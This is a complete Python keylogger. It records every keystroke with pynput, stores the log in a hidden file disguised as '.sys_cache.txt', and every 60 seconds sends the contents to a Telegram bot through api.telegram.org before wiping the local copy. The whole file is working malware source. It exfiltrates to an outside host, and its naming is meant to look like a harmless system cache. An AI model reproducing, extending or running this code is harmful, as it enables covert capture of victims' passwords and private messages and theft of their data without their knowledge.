import pynput.keyboard
import requests
import threading
import os
from datetime import datetime

# --- BOT-CONFIGURATION ---
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
LOG_FILE = ".sys_cache.txt" # Hidden cache file

def is_online():
    """Checks if the computer has internet access."""
    try:
        requests.get("https://www.google.com", timeout=3)
        return True
    except:
        return False

def append_to_file(data):
    """Saves logs locally if offline or as a backup."""
    with open(LOG_FILE, "a") as f:
        f.write(data)

def send_to_telegram():
    """Reads the cache file and sends everything to Telegram."""
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            content = f.read()
        
        if content.strip():
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            payload = {"chat_id": CHAT_ID, "text": f"📅 Sync Time: {current_time}\n\n{content}"}
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            
            try:
                response = requests.post(url, data=payload)
                if response.status_code == 200:
                    # Clear the file after successful sync
                    open(LOG_FILE, "w").close()
            except:
                pass

def report():
    """The Sync Loop: Tries to upload every 60 seconds."""
    if is_online():
        send_to_telegram()
    
    timer = threading.Timer(60, report)
    timer.daemon = True
    timer.start()

def on_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            current_key = " "
        elif key == pynput.keyboard.Key.enter:
            current_key = f" [ENTER at {datetime.now().strftime('%H:%M:%S')}]\n"
        else:
            current_key = f" [{str(key)}] "
    
    # Always save locally first (Persistence of data)
    append_to_file(current_key)

# --- START ---
# Create the file if it doesn't exist
if not os.path.exists(LOG_FILE):
    open(LOG_FILE, "w").close()

report()
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()